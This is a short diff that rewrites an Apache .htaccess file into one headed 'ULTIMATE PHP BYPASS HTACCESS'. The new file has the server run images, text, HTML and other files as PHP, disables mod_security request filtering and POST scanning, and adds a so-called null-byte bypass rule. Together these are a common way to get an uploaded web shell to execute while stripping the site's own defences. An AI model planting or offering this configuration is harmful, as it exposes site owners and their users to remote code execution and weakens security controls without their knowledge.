@@ -1,1 +1,16 @@
-AddType application/x-httpd-php .z
+# ULTIMATE PHP BYPASS HTACCESS
+<FilesMatch "\.(php|php5|phtml|pl|php3|php4)$">
+    ForceType application/x-httpd-php
+</FilesMatch>
+
+# BYPASS ALL EXTENSIONS
+AddType application/x-httpd-php .php .jpg .png .gif .txt .html .htm .asp .jsp
+
+# DISABLE SECURITY
+<IfModule mod_security.c>
+    SecFilterEngine Off
+    SecFilterScanPOST Off
+</IfModule>
+
+# NULL BYTE BYPASS
+SetEnvIf Request_URI "\.php.*$" force-php
